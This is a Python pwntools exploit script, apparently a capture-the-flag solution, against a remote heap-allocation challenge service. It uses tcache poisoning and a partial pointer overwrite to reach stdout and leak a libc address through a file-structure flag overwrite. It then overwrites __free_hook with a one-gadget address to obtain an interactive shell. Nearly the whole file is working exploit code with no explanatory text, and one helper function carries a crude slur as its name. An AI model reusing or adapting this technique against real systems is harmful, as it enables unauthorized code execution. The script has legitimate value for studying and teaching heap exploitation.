from pwn import *
from heaputils import *

def malloc_retarded(data,size):
	p.sendlineafter("Your choice: ","1")
	p.sendlineafter("Size: ",str(size))
	p.sendafter("Data: ",data)

def malloc(data,size):
	realloc("",2**64-1)
	realloc(data,size)

def calloc(data,size):
	p.sendlineafter("Your choice: ","2")
	p.sendlineafter("Size: ",str(size))
	p.sendafter("Data: ",data)

def realloc(data,size):
	p.sendlineafter("Your choice: ","3")
	p.sendlineafter("Size: ",str(size))
	p.sendafter("Data: ",data)

def free(which):
	p.sendlineafter("Your choice: ","4")
	p.sendlineafter("Which: ",which)

if __name__ == "__main__":
	libc = ELF("./libc.so.6")
	context.log_level = 'debug'
	p = remote("ast-alloc.chal.ctf.westerns.tokyo", 10001)
	
	realloc("\xcc"*0x80,0x80)
	calloc("\xdd"*0x50,0x50)
	for i in range(8):
		free("r")

	for i in range(2):
		free("c")

	malloc("\x60",0x50) # 0x50 chunk fd connect to stdout (tcache -> chunk -> chunk -> libc)

	cheat = 0x6760
	malloc(p16(cheat),0x80) # partial overwrite of main arena to stdout
	# malloc three times to get stdout allocated
	for i in range(2):
		malloc("\x55"*0x50,0x50)

	pay = p64(0x00000000fbad1800) + p64(0)*3 + chr(0)
	malloc_retarded(pay, 0x50)
	data = p.recvuntil("=================================").strip("=================================")
	LIBC = u64(data[0x8:0x10]) + 0x7fe94bd55000 - 0x7fe94c1428b0
	log.info("LIBC: 0x%x"%LIBC)

	gets = LIBC + libc.symbols['gets']
	system = LIBC + libc.symbols['system']
	realloc_hook =  LIBC + libc.symbols['__realloc_hook']
	free_hook = LIBC + libc.symbols['__free_hook']
	oneshots = [0x4f2c5, 0x4f322, 0x10a38c]
	oneshot = LIBC + oneshots[1]

	context.log_level = 'debug'
	
	
	malloc("c"*0x60,0x90)
	free("r")
	free("r")

	
	malloc(p64(free_hook),0x90)
	malloc(p64(0xdeadbeef),0x90)
	malloc(p64(oneshot),0x90)
	# now gets will be called

	free("r")

	p.interactive()